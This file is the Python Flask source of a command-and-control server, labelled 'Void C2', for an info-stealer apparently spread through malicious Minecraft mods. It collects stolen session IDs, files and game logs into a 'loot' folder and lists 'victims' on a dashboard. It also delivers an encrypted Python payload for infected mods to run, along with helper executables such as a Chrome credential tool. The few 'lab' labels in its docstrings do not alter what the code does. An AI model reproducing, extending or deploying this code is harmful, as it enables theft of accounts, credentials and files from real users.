"""Void C2 server - receives stealer check-ins and loot. Run on your VPS."""
import os, json, datetime, re
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT, exist_ok=True)

def log(msg):
    print(f"[{datetime.datetime.now().isoformat(timespec='seconds')}] {msg}", flush=True)

@app.route("/shard/prefireMc", methods=["POST"])
def prefire():
    data = request.get_json(force=True, silent=True) or {}
    prefire_id = os.urandom(8).hex()
    log(f"prefire from {request.remote_addr} user={data.get('userId')} session={str(data.get('sessionId'))[:16]}... -> {prefire_id}")
    return jsonify({"prefireId": prefire_id})

@app.route("/shard", methods=["GET", "POST"])
def shard():
    if request.method == "GET":
        return jsonify({"status": "ok"})
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userId", "unknown")
    log(f"shard_post from {uid} keys={list(data.keys())}")
    with open(os.path.join(LOOT, f"shard_{uid}.json"), "a") as f:
        f.write(json.dumps({"ts": datetime.datetime.now().isoformat(), "ip": request.remote_addr, "data": data}) + "\n")
    return jsonify({"status": "ok"})

@app.route("/submit", methods=["POST"])
def submit():
    uid = request.form.get("userId", "unknown")
    for key, f in request.files.items():
        path = os.path.join(LOOT, f"{uid}_{key}_{f.filename}")
        f.save(path)
        log(f"loot {path} ({os.path.getsize(path)} bytes)")
    # also accept raw json loot
    if request.is_json:
        data = request.get_json(silent=True) or {}
        with open(os.path.join(LOOT, f"loot_{uid}.json"), "a") as fh:
            fh.write(json.dumps(data) + "\n")
        log(f"json loot from {uid}: {list(data.keys())}")
    return jsonify({"status": "ok"})

@app.route("/shard/submitMinecraftLog", methods=["POST"])
def mc_log():
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userId", "unknown")
    with open(os.path.join(LOOT, f"mc_{uid}.log"), "a", encoding="utf-8", errors="replace") as f:
        f.write(f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n")
        f.write(data.get("content", "")[:1_000_000])
    log(f"minecraft log from {uid} ({len(data.get('content',''))} bytes)")
    return jsonify({"status": "ok"})

@app.route("/loot/<path:name>", methods=["GET"])
def get_loot(name):
    return send_from_directory(LOOT, name)

DASH = """<!doctype html><html><head><meta charset=utf-8><title>Void C2</title>
<style>body%%BG%%</style></head><body>
<h1>&#128293; VOID C2</h1><p>__N__ victims</p>
<table><tr><th>victim</th><th>last seen</th><th>categories</th><th>records</th><th>loot</th></tr>__ROWS__</table>
</body></html>""".replace("%%BG%%", "{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}"
"h1{color:#f85149}table{border-collapse:collapse;width:100%}"
"td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}"
"th{background:#161b22}a{color:#58a6ff}")

@app.route("/", methods=["GET"])
@app.route("/dashboard", methods=["GET"])
def dashboard():
    return ("", 404)

PANEL_PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.dat")

@app.route("/mod/fetch", methods=["GET"])
def mod_fetch():
    """Sealed Python payload for lab mods (packed by tools/make_payload.py:
    BH01 magic + iv(12) + tag(16) + ciphertext). Mod decrypts with panel key
    inside the pinned channel and runs it."""
    import base64 as _b
    if not os.path.isfile(PANEL_PAYLOAD):
        return jsonify({"status": "no-payload"}), 404
    blob = open(PANEL_PAYLOAD, "rb").read()
    if len(blob) < 32 or blob[:4] != b"BH01":
        return jsonify({"status": "bad-payload"}), 500
    return jsonify({"iv": _b.b64encode(blob[4:16]).decode(),
                    "tag": _b.b64encode(blob[16:32]).decode(),
                    "data": _b.b64encode(blob[32:]).decode()})

@app.route("/mod/submit", methods=["POST"])
def mod_submit():
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userId", "unknown") + "-modloot"
    with open(os.path.join(LOOT, f"modloot_{uid}.json"), "a") as fh:
        fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                             "ip": request.remote_addr, "size": len(str(data))}) + "\n")
    log(f"mod loot from {uid}")
    return jsonify({"status": "ok"})

@app.route("/mod/tool", methods=["GET"])
def mod_tool():
    """Helper binaries for lab mods (e.g. ?name=chromelevator_x64.exe).
    Served over the pinned channel; mod drops them next to the payload."""
    name = request.args.get("name", "")
    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if not os.path.isfile(path):
        return jsonify({"status": "no-tool"}), 404
    return send_from_directory(os.path.dirname(path), name)

@app.route("/mod/checkin", methods=["POST"])
def mod_checkin():
    """Pinned-TLS lab-mod check-in. Body is an AES-GCM envelope
    {key, iv, data} (base64); key unwrap happens inside the pinned channel.
    Lab operators: replace TODO key handling with your KMS of choice."""
    import base64 as _b
    from Crypto.Cipher import AES as _AES
    data = request.get_json(force=True, silent=True) or {}
    try:
        key = _b.b64decode(data["key"]);
        iv = _b.b64decode(data["iv"]);
        ct = _b.b64decode(data["data"])
        pt = _AES.new(key, _AES.MODE_GCM, iv).decrypt(ct)[:-16]
        inner = json.loads(pt.decode())
        uid = inner.get("user", "unknown") + "-mod"
        with open(os.path.join(LOOT, f"mod_{uid}.json"), "a") as fh:
            fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                                 "ip": request.remote_addr, "data": inner}) + "\n")
        log(f"mod check-in from {uid} uuid={inner.get('uuid')}")
        return jsonify({"status": "ok"})
    except Exception as e:
        log(f"mod check-in failed: {str(e)[:80]}")
        return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--tls-cert", default=None, help="panel.crt for pinned-TLS mod endpoint")
    ap.add_argument("--tls-key", default=None, help="panel.key for pinned-TLS mod endpoint")
    a = ap.parse_args()
    print(f"Void C2 listening on 0.0.0.0:{a.port}, loot -> ./loot")
    if a.tls_cert and a.tls_key:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(a.tls_cert, a.tls_key)
        app.run(host="0.0.0.0", port=a.port, ssl_context=context)
    else:
        app.run(host="0.0.0.0", port=a.port)
